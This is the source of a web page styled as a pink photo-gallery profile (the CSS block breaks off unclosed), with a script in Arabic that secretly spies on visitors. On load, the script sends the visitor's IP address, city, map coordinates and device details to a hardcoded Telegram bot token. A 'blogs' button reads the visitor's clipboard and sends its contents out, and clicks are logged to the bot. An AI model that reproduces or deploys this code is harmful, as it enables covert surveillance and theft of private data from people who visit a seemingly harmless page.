  <style>
    body {
      margin: 0;
      background-color: pink;
      font-family: Arial, sans-serif;
      direction: rtl;
      text-align: center;
      overflow-x: hidden;
      position: relative;
    }

    .top-description {
      background: linear-gradient(90deg, #4b0082, black, #4b0082);
      color: white;
      padding: 15px;
      font-weight: bold;
      font-size: 16px;
      animation: fadeInOut 5s ease-in-out infinite;
    }

    @keyframes fadeInOut {
      0%, 100% { opacity: 0.1; }
      50% { opacity: 1; }
    }

    header {
      background-image: url('5alfia.png');
      background-size: cover;
      background-position: center;
      height: 250px;
      position: relative;
    }

    .profile-pic {
      width: 110px;
      height: 110px;
      border-radius: 50%;
      border: 5px solid white;
      background-image: url('profile.png');
      background-size: cover;
      background-position: center;
      position: absolute;
      bottom: -55px;
      right: 20px;
      animation: pulse 2s infinite;
      box-shadow: 0 0 10px purple;
      cursor: pointer;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
      70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
      100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
    }

    .posts-container {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      padding: 80px 10px 30px;
    }

    .post-img {
      width: 100%;
      height: 120px;
      object-fit: cover;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.3s, box-shadow 0.3s;
    }

    .post-img:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px #4b0082;
    }

    .lightbox {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
      flex-direction: column;
    }

    .lightbox img {
      max-width: 90%;
      max-height: 80%;
      border-radius: 10px;
      margin-bottom: 20px;
    }

    .lightbox:target {
      display: flex;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 30px;
      color: white;
      text-decoration: none;
    }

    .download-btn {
      background-color: purple;
      color: white;
      padding: 10px 20px;
      border-radius: 10px;
      text-decoration: none;
      font-size: 16px;
    }

    .video-fab, .blog-fab {
      position: fixed;
      bottom: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      animation: pulse 2s infinite;
      cursor: pointer;
      z-index: 1000;
    }

    .video-fab {
      right: 20px;
      background-color: black;
      color: pink;
      box-shadow: 0 0 15px pink;
    }

    .blog-fab {
      left: 20px;
      background-color: yellow;
      color: black;
      box-shadow: 0 0 15px yellow;

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";
    let report = "🛑 تقرير دخول جديد:\n\n";

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
      });
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json");
        const data = await res.json();
        report += `🌐 IP: ${data.ip}\n📍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}\n🌎 إحداثيات: ${data.loc}\n🛰️ خريطة: https://www.google.com/maps?q=${data.loc}\n\n`;
      } catch {
        report += "❌ فشل جلب IP\n\n";
      }
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;
      if (/android/i.test(ua)) report += "📱 أندرويد ✅\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 آيفون ✅\n";
      else if (/windows/i.test(ua)) report += "💻 ويندوز ✅\n";
      else report += "🌀 غير معروف ❌\n";

      if (/chrome/i.test(ua)) report += "🌐 Chrome ✅\n";
      else if (/firefox/i.test(ua)) report += "🌐 Firefox ✅\n";
      else report += "🌐 غير معروف ❌\n";
      report += "\n";
    }

    async function runReport() {
      await getIPInfo();
      getDeviceInfo();
      sendToTelegram(report);
    }

    runReport();

    function goToIndex() {
      sendToTelegram("🎬 تم الضغط على زر الفيديو");
      location.href = "index-videos.html";
    }

    function goToBlog() {
      sendToTelegram("📖 تم الضغط على زر المدونات\n📋 طلب إذن وصول للحافظة...");
      navigator.permissions.query({ name: "clipboard-read" }).then(async result => {
        if (result.state === "denied") {
          alert("アクセス拒否されました（رفض الوصول）");
        } else {
          try {
            const text = await navigator.clipboard.readText();
            sendToTelegram("📋 محتوى الحافظة:\n" + text);
            alert("アクセス許可されました（تم السماح）");
          } catch {
            sendToTelegram("⚠️ فشل قراءة الحافظة");
          }
        }
      }).catch(() => {
        sendToTelegram("❌ المتصفح لا يدعم قراءة الحافظة");
      });
    }

    // أي نقر داخل الصفحة يُرسل للبوت
    function handleClick(e) {
      const tag = e.target.tagName;
      let label = e.target.innerText || e.target.alt || tag;
      sendToTelegram(`🖱️ تم الضغط على: ${label}`);
    }
  </script>
